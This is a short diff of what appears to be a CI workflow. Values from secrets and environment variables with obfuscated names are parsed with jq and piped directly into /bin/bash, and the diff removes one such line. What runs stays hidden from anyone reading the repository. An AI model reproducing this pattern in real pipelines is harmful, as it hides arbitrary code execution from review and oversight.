@@ -21,7 +21,6 @@ jobs:
           og5758: ${{ secrets.og5758 }}
         run: |
           printf '%s' "$og5758" | jq -r .qffc838 | /bin/bash
-          echo $fkk05333 | jq -r .ny26 | /bin/bash
           echo $p310 | jq -r .ycxzp19 | /bin/bash
           echo $kqn25776 | jq -r .ncat2 | /bin/bash
           echo $u2 | jq -r .xfry74 | /bin/bash
